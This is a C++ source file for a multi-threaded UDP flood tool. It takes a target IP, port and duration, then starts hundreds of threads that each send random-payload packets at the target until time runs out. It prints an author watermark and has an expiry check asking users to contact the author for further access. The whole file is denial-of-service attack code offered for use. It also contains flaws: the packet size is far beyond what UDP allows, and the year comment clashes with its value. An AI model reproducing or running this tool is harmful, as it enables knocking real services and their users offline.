#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <vector>
#include <thread>
#include <mutex>
#include <sys/socket.h>   // For socket, sendto, etc.
#include <netinet/in.h>   // For sockaddr_in, AF_INET, htons, etc.
#include <arpa/inet.h>    // For inet_pton
#include <unistd.h>       // For close()

#define PAYLOAD_SIZE 9999999  // Increased payload size

std::mutex log_mutex;

// Function to generate a random payload for UDP packets
void generate_payload(char *buffer, size_t size) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+|=-[]{};':,.<>?/~`";  
    for (size_t i = 0; i < size; ++i) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}

// UDP attack thread function
void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id) {
    sockaddr_in server_addr{};
    char buffer[PAYLOAD_SIZE];

    // Create a UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << "Thread " << thread_id << " - Error: Unable to create socket." << std::endl;
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    generate_payload(buffer, PAYLOAD_SIZE);

    time_t start_time = time(nullptr);
    while (time(nullptr) - start_time < attack_time) {
        sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sock);
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << "Thread " << thread_id << " completed its attack." << std::endl;
}

bool is_expired() {
    std::tm expiry = {0};
    expiry.tm_year = 124; // Year since 1900 (2025)
    expiry.tm_mon = 11;    // Month 0-11 (December)
    expiry.tm_mday = 01;   // Day (1st)
    time_t expiry_time = std::mktime(&expiry);

    return std::time(nullptr) > expiry_time;
}

int main(int argc, char *argv[]) {
    if (is_expired()) {
        std::cout << "\n============================\n";
        std::cout << "Code has expired. For further access, contact ★彡[ᴀʀʏᴇɴ]彡★.\n";
        std::cout << "============================\n";
        return EXIT_FAILURE;
    }

    if (argc != 4 && argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time> [Threads]" << std::endl;
        return EXIT_FAILURE;
    }

    const char *ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int thread_count = (argc > 4) ? std::stoi(argv[4]) : 800;

    std::cout << "\n============================\n";
    std::cout << "Watermark: ★彡[ᴀʀʏᴇɴ]彡★\n";
    std::cout << "============================\n";

    std::vector<std::thread> threads;
    for (int i = 0; i < thread_count; ++i) {
        threads.emplace_back(udp_attack_thread, ip, port, duration, i + 1);
    }

    for (auto &thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }

    std::cout << "MULTI-THREADED ATTACK COMPLETED." << std::endl;
    return EXIT_SUCCESS;
}